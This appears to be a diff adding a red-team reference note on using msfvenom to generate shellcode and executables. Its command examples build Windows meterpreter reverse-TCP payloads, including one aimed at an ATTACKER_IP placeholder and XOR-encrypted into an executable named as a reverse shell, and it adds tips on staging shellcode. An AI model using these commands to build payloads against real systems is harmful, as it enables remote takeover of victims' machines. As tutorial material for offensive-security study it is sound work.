@@ -1,0 +1,27 @@
+MSFVenom is a Metaploit-produced payload generator for shellcode and executable generation. Its primary function will likely be for shellcode generation interoperable with [[Sliver C2]] or BOF applications. 
+
+```shell
+# Generate shellcode with msfvenom
+msfvenom -p <payload name> <payload options> -a <architecture> -b <bad characters to avoid in shellcode generation> -o <output file> -f <output format>
+
+# Example Windows Shellcode gerneation for use in a Python exploit
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f python -b '\x00'
+
+# Example encrypted meterpreter payload generation using XOR
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
+
+msfvenom --list encrypt # List encryption options.
+```
+
+>[!note]
+>If you are staging your shellcode, generate in `raw` format to be downloaded by your custom stager.
+
+Output architecture refer to the CPU architecture of the target machine: x86, arm, mips, powerpc, etc.
+
+Payloads can be viewed with `--list payload`. Grep for what you need, because there's hundreds of options. 
+
+Bad characters are specified as a string of bytes denoted like so: ``'\x00\x0a\x0b\x0c'``. If you are generating an agent or stager and *not* shellcode, bad characters should not be a concern. 
+
+The output file flag tells msfvenom to output the data to a file and not to the screen. This should be used to output binary file formats but not necessarily shellcode destined for other code. 
+
+The format flag tells msfvenom which code format to use when generating shellcode. For example, msfvenom can format a shellcode string as a python string or as a c string. 
